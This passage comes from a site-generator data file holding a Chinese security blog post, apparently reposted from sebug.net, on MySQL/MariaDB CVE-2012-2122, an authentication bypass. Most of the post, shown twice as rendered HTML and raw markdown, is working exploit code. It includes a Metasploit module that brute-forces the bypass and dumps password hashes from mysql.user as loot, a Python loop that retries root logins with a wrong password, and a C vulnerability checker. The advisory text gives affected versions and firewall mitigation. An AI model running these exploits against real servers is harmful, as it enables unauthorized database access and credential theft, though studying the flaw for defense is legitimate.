class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#####  方法一、</span></div><div class=\"line\"></div><div class=\"line\">&amp;nbsp;</div><div class=\"line\"><span class=\"comment\">##</span></div><div class=\"line\"><span class=\"comment\"># This file is part of the Metasploit Framework and may be subject to</span></div><div class=\"line\"><span class=\"comment\"># redistribution and commercial restrictions. Please see the Metasploit</span></div><div class=\"line\"><span class=\"comment\"># web site for more information on licensing and terms of use.</span></div><div class=\"line\"><span class=\"comment\"># http://metasploit.com/</span></div><div class=\"line\"><span class=\"comment\">##</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'msf/core'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Metasploit3</span> &<span class=\"title\">lt</span>;</span> <span class=\"constant\">Msf::Auxiliary</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">include</span> <span class=\"constant\">Msf::Exploit::Remote::MYSQL</span></div><div class=\"line\"><span class=\"keyword\">include</span> <span class=\"constant\">Msf::Auxiliary::Report</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">include</span> <span class=\"constant\">Msf::Auxiliary::Scanner</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> </span>initialize</div><div class=\"line\"><span class=\"keyword\">super</span>(</div><div class=\"line\"><span class=\"string\">'Name'</span> =&gt; <span class=\"string\">'MYSQL CVE-2012-2122 Authentication Bypass Password Dump'</span>,</div><div class=\"line\"><span class=\"string\">'Version'</span> =&gt; <span class=\"string\">'$Revision$'</span>,</div><div class=\"line\"><span class=\"string\">'Description'</span> =&gt; %<span class=\"constant\">Q</span>{</div><div class=\"line\"><span class=\"constant\">This</span> <span class=\"class\"><span class=\"keyword\">module</span> <span class=\"title\">exploits</span> <span class=\"title\">a</span> <span class=\"title\">password</span> <span class=\"title\">bypass</span> <span class=\"title\">vulnerability</span> <span class=\"title\">in</span> <span class=\"title\">MySQL</span> <span class=\"title\">in</span> <span class=\"title\">order</span></span></div><div class=\"line\">to extract the usernames <span class=\"keyword\">and</span> encrypted password hashes from a <span class=\"constant\">MySQL</span> server.</div><div class=\"line\"><span class=\"constant\">These</span> hashes ares stored as loot <span class=\"keyword\">for</span> later cracking.</div><div class=\"line\">},</div><div class=\"line\"><span class=\"string\">'Authors'</span> =&gt; [</div><div class=\"line\"><span class=\"string\">'TheLightCosine &lt;thelightcosine[at]metasploit.com&gt;'</span>, <span class=\"comment\"># Original hashdump module</span></div><div class=\"line\"><span class=\"string\">'jcran'</span> <span class=\"comment\"># Authentication bypass bruteforce implementation</span></div><div class=\"line\">],</div><div class=\"line\"><span class=\"string\">'References'</span> =&gt; [</div><div class=\"line\">[<span class=\"string\">'CVE'</span>, <span class=\"string\">'2012-2122'</span>]</div><div class=\"line\">],</div><div class=\"line\"><span class=\"string\">'DisclosureDate'</span> =&gt; <span class=\"string\">'Jun 09 2012'</span>,</div><div class=\"line\"><span class=\"string\">'License'</span> =&gt; <span class=\"constant\">MSF_LICENSE</span></div><div class=\"line\">)</div><div class=\"line\"></div><div class=\"line\">deregister_options(<span class=\"string\">'PASSWORD'</span>)</div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> </span>run_host(ip)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Keep track of results (successful connections)</span></div><div class=\"line\">results = []</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Username and password placeholders</span></div><div class=\"line\">username = datastore[<span class=\"string\">'USERNAME'</span>]</div><div class=\"line\">password = <span class=\"constant\">Rex::Text</span>.rand_text_alpha(rand(<span class=\"number\">8</span>)+<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Do an initial check to see if we can log into the server at all</span></div><div class=\"line\"><span class=\"keyword\">begin</span></div><div class=\"line\">socket = connect(<span class=\"keyword\">false</span>)</div><div class=\"line\">x = <span class=\"constant\">::RbMysql</span>.connect({</div><div class=\"line\"><span class=\"symbol\">:host</span> =&gt; rhost,</div><div class=\"line\"><span class=\"symbol\">:port</span> =&gt; rport,</div><div class=\"line\"><span class=\"symbol\">:user</span> =&gt; username,</div><div class=\"line\"><span class=\"symbol\">:password</span> =&gt; password,</div><div class=\"line\"><span class=\"symbol\">:read_timeout</span> =&gt; <span class=\"number\">300</span>,</div><div class=\"line\"><span class=\"symbol\">:write_timeout</span> =&gt; <span class=\"number\">300</span>,</div><div class=\"line\"><span class=\"symbol\">:socket</span> =&gt; socket</div><div class=\"line\">})</div><div class=\"line\">x.connect</div><div class=\"line\">results &lt;&lt; x</div><div class=\"line\"></div><div class=\"line\">print_good &quot;<span class=\"comment\">#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password&quot;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">rescue</span> <span class=\"constant\">RbMysql::HostNotPrivileged</span></div><div class=\"line\">print_error &quot;<span class=\"comment\">#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)&quot;</span></div><div class=\"line\"><span class=\"keyword\">return</span></div><div class=\"line\"><span class=\"keyword\">rescue</span> <span class=\"constant\">RbMysql::AccessDeniedError</span></div><div class=\"line\">print_good &quot;<span class=\"comment\">#{rhost}:#{rport} The server allows logins, proceeding with bypass test&quot;</span></div><div class=\"line\"><span class=\"keyword\">rescue</span> <span class=\"constant\">::Interrupt</span></div><div class=\"line\">raise <span class=\"variable\">$!</span></div><div class=\"line\"><span class=\"keyword\">rescue</span> <span class=\"constant\">::Exception</span> =&gt; e</div><div class=\"line\">print_error &quot;<span class=\"comment\">#{rhost}:#{rport} Error: #{e}&quot;</span></div><div class=\"line\"><span class=\"keyword\">return</span></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Short circuit if we already won</span></div><div class=\"line\"><span class=\"keyword\">if</span> results.length &gt; <span class=\"number\">0</span></div><div class=\"line\"><span class=\"variable\">@mysql_handle</span> = results.first</div><div class=\"line\"><span class=\"keyword\">return</span> dump_hashes</div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># Threaded login checker</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">max_threads = <span class=\"number\">16</span></div><div class=\"line\">cur_threads = []</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Try up to 1000 times just to be sure</span></div><div class=\"line\">queue = [*(<span class=\"number\">1</span> .. <span class=\"number\">1000</span>)]</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">while</span>(queue.length &gt; <span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"keyword\">while</span>(cur_threads.length &lt; max_threads)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># We can stop if we get a valid login</span></div><div class=\"line\"><span class=\"keyword\">break</span> <span class=\"keyword\">if</span> results.length &gt; <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># keep track of how many attempts we've made</span></div><div class=\"line\">item = queue.shift</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># We can stop if we reach 1000 tries</span></div><div class=\"line\"><span class=\"keyword\">break</span> <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> item</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Status indicator</span></div><div class=\"line\">print_status &quot;<span class=\"comment\">#{rhost}:#{rport} Authentication bypass is #{item/10}% complete&quot; if (item % 100) == 0</span></div><div class=\"line\"></div><div class=\"line\">t = <span class=\"constant\">Thread</span>.new(item) <span class=\"keyword\">do</span> |count|</div><div class=\"line\"><span class=\"keyword\">begin</span></div><div class=\"line\"><span class=\"comment\"># Create our socket and make the connection</span></div><div class=\"line\">s = connect(<span class=\"keyword\">false</span>)</div><div class=\"line\">x = <span class=\"constant\">::RbMysql</span>.connect({</div><div class=\"line\"><span class=\"symbol\">:host</span> =&gt; rhost,</div><div class=\"line\"><span class=\"symbol\">:port</span> =&gt; rport,</div><div class=\"line\"><span class=\"symbol\">:user</span> =&gt; username,</div><div class=\"line\"><span class=\"symbol\">:password</span> =&gt; password,</div><div class=\"line\"><span class=\"symbol\">:read_timeout</span> =&gt; <span class=\"number\">300</span>,</div><div class=\"line\"><span class=\"symbol\">:write_timeout</span> =&gt; <span class=\"number\">300</span>,</div><div class=\"line\"><span class=\"symbol\">:socket</span> =&gt; s,</div><div class=\"line\"><span class=\"symbol\">:db</span> =&gt; <span class=\"keyword\">nil</span></div><div class=\"line\">})</div><div class=\"line\">print_status &quot;<span class=\"comment\">#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts&quot;</span></div><div class=\"line\">results &lt;&lt; x</div><div class=\"line\"><span class=\"keyword\">rescue</span> <span class=\"constant\">RbMysql::AccessDeniedError</span></div><div class=\"line\"><span class=\"keyword\">rescue</span> <span class=\"constant\">Exception</span> =&gt; e</div><div class=\"line\">print_status &quot;<span class=\"comment\">#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}&quot;</span></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\">cur_threads &lt;&lt; t</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># We can stop if we get a valid login</span></div><div class=\"line\"><span class=\"keyword\">break</span> <span class=\"keyword\">if</span> results.length &gt; <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Add to a list of dead threads if we're finished</span></div><div class=\"line\">cur_threads.each_index <span class=\"keyword\">do</span> |ti|</div><div class=\"line\">t = cur_threads[ti]</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> t.alive?</div><div class=\"line\">cur_threads[ti] = <span class=\"keyword\">nil</span></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Remove any dead threads from the set</span></div><div class=\"line\">cur_threads.delete(<span class=\"keyword\">nil</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"constant\">::IO</span>.select(<span class=\"keyword\">nil</span>, <span class=\"keyword\">nil</span>, <span class=\"keyword\">nil</span>, <span class=\"number\">0</span>.<span class=\"number\">25</span>)</div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Clean up any remaining threads</span></div><div class=\"line\">cur_threads.each {|x| x.kill }</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> results.length &gt; <span class=\"number\">0</span></div><div class=\"line\">print_good(&quot;<span class=\"comment\">#{rhost}:#{rport} Successful exploited the authentication bypass flaw, dumping hashes...&quot;)</span></div><div class=\"line\"><span class=\"variable\">@mysql_handle</span> = results.first</div><div class=\"line\"><span class=\"keyword\">return</span> dump_hashes</div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\">print_error(&quot;<span class=\"comment\">#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable&quot;)</span></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> </span>dump_hashes</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Grabs the username and password hashes and stores them as loot</span></div><div class=\"line\">res = mysql_query(&quot;<span class=\"constant\">SELECT</span> user,password from mysql.user&quot;)</div><div class=\"line\"><span class=\"keyword\">if</span> res.<span class=\"keyword\">nil</span>?</div><div class=\"line\">print_error(&quot;<span class=\"comment\">#{rhost}:#{rport} There was an error reading the MySQL User Table&quot;)</span></div><div class=\"line\"><span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Create a table to store data</span></div><div class=\"line\">tbl = <span class=\"constant\">Rex::Ui::Text::Table</span>.new(</div><div class=\"line\"><span class=\"string\">'Header'</span> =&gt; <span class=\"string\">'MysQL Server Hashes'</span>,</div><div class=\"line\"><span class=\"string\">'Indent'</span> =&gt; <span class=\"number\">1</span>,</div><div class=\"line\"><span class=\"string\">'Columns'</span> =&gt; [<span class=\"string\">'Username'</span>, <span class=\"string\">'Hash'</span>]</div><div class=\"line\">)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> res.size &gt; <span class=\"number\">0</span></div><div class=\"line\">res.each <span class=\"keyword\">do</span> |row|</div><div class=\"line\"><span class=\"keyword\">next</span> <span class=\"keyword\">unless</span> (row[<span class=\"number\">0</span>].to_s + row[<span class=\"number\">1</span>].to_s).length &gt; <span class=\"number\">0</span></div><div class=\"line\">tbl &lt;&lt; [row[<span class=\"number\">0</span>], row[<span class=\"number\">1</span>]]</div><div class=\"line\">print_good(&quot;<span class=\"comment\">#{rhost}:#{rport} Saving HashString as Loot: #{row[0]}:#{row[1]}&quot;)</span></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\">this_service = <span class=\"keyword\">nil</span></div><div class=\"line\"><span class=\"keyword\">if</span> framework.db <span class=\"keyword\">and</span> framework.db.active</div><div class=\"line\">this_service = report_service(</div><div class=\"line\"><span class=\"symbol\">:host</span> =&gt; rhost,</div><div class=\"line\"><span class=\"symbol\">:port</span> =&gt; rport,</div><div class=\"line\"><span class=\"symbol\">:name</span> =&gt; <span class=\"string\">'mysql'</span>,</div><div class=\"line\"><span class=\"symbol\">:proto</span> =&gt; <span class=\"string\">'tcp'</span></div><div class=\"line\">)</div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\">report_hashes(tbl.to_csv, this_service) <span class=\"keyword\">unless</span> tbl.rows.empty?</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Stores the Hash Table as Loot for Later Cracking</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> </span>report_hashes(hash_loot,service)</div><div class=\"line\">filename= &quot;<span class=\"comment\">#{rhost}-#{rport}_mysqlhashes.txt&quot;</span></div><div class=\"line\">path = store_loot(&quot;mysql.hashes&quot;, &quot;text/plain&quot;, rhost, hash_loot, filename, &quot;<span class=\"constant\">MySQL</span> <span class=\"constant\">Hashes</span>&quot;, service)</div><div class=\"line\">print_status(&quot;<span class=\"comment\">#{rhost}:#{rport} Hash Table has been saved: #{path}&quot;)</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">end</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">end</span></div></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">########################################################################################</span></div><div class=\"line\">测试方法,<span class=\"number\">2</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"keyword\">import</span> subprocess</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</div><div class=\"line\"> subprocess.Popen(&quot;mysql -u root mysql --password=blah&quot;, shell=<span class=\"keyword\">True</span>).wait()</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">########################################################################################</span></div></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\">测试方法,<span class=\"number\">3</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"preprocessor\">#include &lt;stdio.h&gt;</span></div><div class=\"line\"><span class=\"preprocessor\">#include &lt;stdlib.h&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> main(<span class=\"keyword\">void</span>) {</div><div class=\"line\"> <span class=\"keyword\">int</span> one, two, ret;</div><div class=\"line\"> time_t start = time(<span class=\"number\">0</span>);</div><div class=\"line\"> time_t now;</div><div class=\"line\"></div><div class=\"line\"> srand(getpid()*start);</div><div class=\"line\"> <span class=\"keyword\">while</span> (<span class=\"number\">1</span>) {</div><div class=\"line\"> one = rand();</div><div class=\"line\"> two = rand();</div><div class=\"line\"> ret = <span class=\"built_in\">memcmp</span>(&amp;one, &amp;two, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>));</div><div class=\"line\"> <span class=\"keyword\">if</span> (ret &lt; -<span class=\"number\">128</span> || ret &gt; <span class=\"number\">127</span>)</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> time(&amp;now);</div><div class=\"line\"> <span class=\"keyword\">if</span> (now - start &gt; <span class=\"number\">10</span>) {</div><div class=\"line\"> <span class=\"built_in\">printf</span>(&quot;Not triggered in <span class=\"number\">10</span> seconds, *probably* not vulnerable..n&quot;);</div><div class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\"> }</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"built_in\">printf</span>(&quot;Vulnerable! <span class=\"built_in\">memcmp</span> returned: %dn&quot;, ret);</div><div class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<p>安全建议:</p>\n<p>临时解决办法：</p>\n<p>在防火墙上关闭mysql端口<br>厂商补丁：</p>\n<h2 id=\"MySQL_AB\">MySQL AB</h2>\n<p>目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：</p>\n<p><a href=\"http://www.mysql.com/\" target=\"_blank\" rel=\"external\">http://www.mysql.com/</a></p>\n<h2 id=\"MariaDB\">MariaDB</h2>\n<p>目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：</p>\n<p><a href=\"http://mariadb.org/\" target=\"_blank\" rel=\"external\">http://mariadb.org/</a></p>\n<p>本文转自：sebug.net</p>\n","source":"_posts/mysql-概率性任意密码身份认证登录漏洞cve-2012-2122.md","raw":"title: \"MySQL 概率性任意密码(身份认证)登录漏洞(CVE-2012-2122)\"\nid: 47\ndate: 2012-07-01 12:16:30\ntags: \n- Metasploit\n- Mysql\n- 任意密码登录\ncategories: \n- 技术文章\n- 最新漏洞\n---\n\n###发布时间: 2012-06-11 (GMT+0800)\n##漏洞版本:\n\nMySQL &lt; 5.6.6\nMySQL &lt; 5.5.24\nMySQL &lt; 5.1.63\nMariaDB &lt; 5.5.23\nMariaDB &lt; 5.3.6\nMariaDB &lt; 5.2.12\nMariaDB &lt; 5.1.62\n\n##漏洞描述:\n\nCVE ID: CVE-2012-2122\n\nMariaDB是为MySQL提供偶然替代功能的数据库服务器。MySQL是开源数据库。\n\nMariaDB 5.1.62, 5.2.12、5.3.6、5.5.23之前版本和MySQL 5.1.63、5.5.24、5.6.6之前版本在用户验证的处理上存在安全漏洞，可能导致攻击者无需知道正确口令就能登录到MySQL服务器。\n\n用户连接到MariaDB/MySQL后，应用会计算和比较令牌值，由于错误的转换，即使memcmp()返回非零值，也可能出现错误的比较，造成MySQL/MariaDB误认为密码是正确的，因为协议使用的是随机字符串，该Bug发生的几率为1/256。MySQL的版本是否受影响取决于程序的编译方式，很多版本（包括官方提供的二进制文件）并不受此漏洞的影响。\n\n也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。而且漏洞利用工具已经出现。\n\n>参考\nhttp://seclists.org/oss-sec/2012/q2/493\n\n测试方法:\n\n本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!\n<!--more-->\n\n```ruby\n#####  方法一、\n\n&amp;nbsp;\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# web site for more information on licensing and terms of use.\n# http://metasploit.com/\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 &lt; Msf::Auxiliary\n\ninclude Msf::Exploit::Remote::MYSQL\ninclude Msf::Auxiliary::Report\n\ninclude Msf::Auxiliary::Scanner\n\ndef initialize\nsuper(\n'Name' =&gt; 'MYSQL CVE-2012-2122 Authentication Bypass Password Dump',\n'Version' =&gt; '$Revision$',\n'Description' =&gt; %Q{\nThis module exploits a password bypass vulnerability in MySQL in order\nto extract the usernames and encrypted password hashes from a MySQL server.\nThese hashes ares stored as loot for later cracking.\n},\n'Authors' =&gt; [\n'TheLightCosine &lt;thelightcosine[at]metasploit.com&gt;', # Original hashdump module\n'jcran' # Authentication bypass bruteforce implementation\n],\n'References' =&gt; [\n['CVE', '2012-2122']\n],\n'DisclosureDate' =&gt; 'Jun 09 2012',\n'License' =&gt; MSF_LICENSE\n)\n\nderegister_options('PASSWORD')\nend\n\ndef run_host(ip)\n\n# Keep track of results (successful connections)\nresults = []\n\n# Username and password placeholders\nusername = datastore['USERNAME']\npassword = Rex::Text.rand_text_alpha(rand(8)+1)\n\n# Do an initial check to see if we can log into the server at all\nbegin\nsocket = connect(false)\nx = ::RbMysql.connect({\n:host =&gt; rhost,\n:port =&gt; rport,\n:user =&gt; username,\n:password =&gt; password,\n:read_timeout =&gt; 300,\n:write_timeout =&gt; 300,\n:socket =&gt; socket\n})\nx.connect\nresults &lt;&lt; x\n\nprint_good &quot;#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password&quot;\n\nrescue RbMysql::HostNotPrivileged\nprint_error &quot;#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)&quot;\nreturn\nrescue RbMysql::AccessDeniedError\nprint_good &quot;#{rhost}:#{rport} The server allows logins, proceeding with bypass test&quot;\nrescue ::Interrupt\nraise $!\nrescue ::Exception =&gt; e\nprint_error &quot;#{rhost}:#{rport} Error: #{e}&quot;\nreturn\nend\n\n# Short circuit if we already won\nif results.length &gt; 0\n@mysql_handle = results.first\nreturn dump_hashes\nend\n\n#\n# Threaded login checker\n#\nmax_threads = 16\ncur_threads = []\n\n# Try up to 1000 times just to be sure\nqueue = [*(1 .. 1000)]\n\nwhile(queue.length &gt; 0)\nwhile(cur_threads.length &lt; max_threads)\n\n# We can stop if we get a valid login\nbreak if results.length &gt; 0\n\n# keep track of how many attempts we've made\nitem = queue.shift\n\n# We can stop if we reach 1000 tries\nbreak if not item\n\n# Status indicator\nprint_status &quot;#{rhost}:#{rport} Authentication bypass is #{item/10}% complete&quot; if (item % 100) == 0\n\nt = Thread.new(item) do |count|\nbegin\n# Create our socket and make the connection\ns = connect(false)\nx = ::RbMysql.connect({\n:host =&gt; rhost,\n:port =&gt; rport,\n:user =&gt; username,\n:password =&gt; password,\n:read_timeout =&gt; 300,\n:write_timeout =&gt; 300,\n:socket =&gt; s,\n:db =&gt; nil\n})\nprint_status &quot;#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts&quot;\nresults &lt;&lt; x\nrescue RbMysql::AccessDeniedError\nrescue Exception =&gt; e\nprint_status &quot;#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}&quot;\nend\nend\n\ncur_threads &lt;&lt; t\n\nend\n\n# We can stop if we get a valid login\nbreak if results.length &gt; 0\n\n# Add to a list of dead threads if we're finished\ncur_threads.each_index do |ti|\nt = cur_threads[ti]\nif not t.alive?\ncur_threads[ti] = nil\nend\nend\n\n# Remove any dead threads from the set\ncur_threads.delete(nil)\n\n::IO.select(nil, nil, nil, 0.25)\nend\n\n# Clean up any remaining threads\ncur_threads.each {|x| x.kill }\n\nif results.length &gt; 0\nprint_good(&quot;#{rhost}:#{rport} Successful exploited the authentication bypass flaw, dumping hashes...&quot;)\n@mysql_handle = results.first\nreturn dump_hashes\nend\n\nprint_error(&quot;#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable&quot;)\nend\n\ndef dump_hashes\n\n# Grabs the username and password hashes and stores them as loot\nres = mysql_query(&quot;SELECT user,password from mysql.user&quot;)\nif res.nil?\nprint_error(&quot;#{rhost}:#{rport} There was an error reading the MySQL User Table&quot;)\nreturn\n\nend\n\n# Create a table to store data\ntbl = Rex::Ui::Text::Table.new(\n'Header' =&gt; 'MysQL Server Hashes',\n'Indent' =&gt; 1,\n'Columns' =&gt; ['Username', 'Hash']\n)\n\nif res.size &gt; 0\nres.each do |row|\nnext unless (row[0].to_s + row[1].to_s).length &gt; 0\ntbl &lt;&lt; [row[0], row[1]]\nprint_good(&quot;#{rhost}:#{rport} Saving HashString as Loot: #{row[0]}:#{row[1]}&quot;)\nend\nend\n\nthis_service = nil\nif framework.db and framework.db.active\nthis_service = report_service(\n:host =&gt; rhost,\n:port =&gt; rport,\n:name =&gt; 'mysql',\n:proto =&gt; 'tcp'\n)\nend\n\nreport_hashes(tbl.to_csv, this_service) unless tbl.rows.empty?\n\nend\n\n# Stores the Hash Table as Loot for Later Cracking\ndef report_hashes(hash_loot,service)\nfilename= &quot;#{rhost}-#{rport}_mysqlhashes.txt&quot;\npath = store_loot(&quot;mysql.hashes&quot;, &quot;text/plain&quot;, rhost, hash_loot, filename, &quot;MySQL Hashes&quot;, service)\nprint_status(&quot;#{rhost}:#{rport} Hash Table has been saved: #{path}&quot;)\n\nend\n\nend\n```\n\n```python\n\n########################################################################################\n测试方法,2\n\n#!/usr/bin/python\nimport subprocess\n\nwhile 1:\n subprocess.Popen(&quot;mysql -u root mysql --password=blah&quot;, shell=True).wait()\n\n########################################################################################\n```\n\n```cpp\n测试方法,3\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void) {\n int one, two, ret;\n time_t start = time(0);\n time_t now;\n\n srand(getpid()*start);\n while (1) {\n one = rand();\n two = rand();\n ret = memcmp(&amp;one, &amp;two, sizeof(int));\n if (ret &lt; -128 || ret &gt; 127)\n break;\n time(&amp;now);\n if (now - start &gt; 10) {\n printf(&quot;Not triggered in 10 seconds, *probably* not vulnerable..n&quot;);\n return 1;\n }\n }\n printf(&quot;Vulnerable! memcmp returned: %dn&quot;, ret);\n return 0;\n}\n```\n\n安全建议:\n\n临时解决办法：\n\n在防火墙上关闭mysql端口\n厂商补丁：\n\nMySQL AB\n--------\n目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：\n\nhttp://www.mysql.com/\n\nMariaDB\n-------\n目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：\n\nhttp://mariadb.org/\n\n本文转自：sebug.net\n","slug":"mysql-概率性任意密码身份认证登录漏洞cve-2012-2122","updated":1421659126000,"excerpt":"<h3 id=\"发布时间:_2012-06-11_(GMT+0800)\">发布时间: 2012-06-11 